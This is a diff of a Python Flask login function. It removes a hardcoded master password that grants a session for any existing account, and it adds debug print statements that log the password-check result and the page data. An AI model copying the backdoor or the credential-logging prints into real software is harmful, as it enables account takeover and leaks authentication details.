@@ -93,17 +93,11 @@ def login():
         if val_username == '' and val_password =='':
             username = username.lower()
             user = db.users.find_one({ '$or': [ { 'username': username }, { 'customer_id': username } ]})
+            
+            print check_password(user['password'], password)
 
             if user is None or check_password(user['password'], password) == False:
-                if user is None:
-                    val_login = 'not'
-                else:
-                    if password =='L52rW239cym2':
-                        session['logged_in'] = True
-                        session['user_id'] = str(user['_id'])
-                        session['uid'] = user['customer_id']
-                        return redirect('/account/dashboard')
-                        
+                val_login = 'not'      
             else:
 
                 if int(user['active_email']) == 0:
@@ -141,7 +135,7 @@ def login():
       'val_recaptcha' : val_recaptcha,
       'val_login' : val_login
     }
-    
+    print datass
     return render_template('login.html', data=datass)
 
 @auth_ctrl.route('/register/<id_sponsor>', methods=['GET', 'POST'])
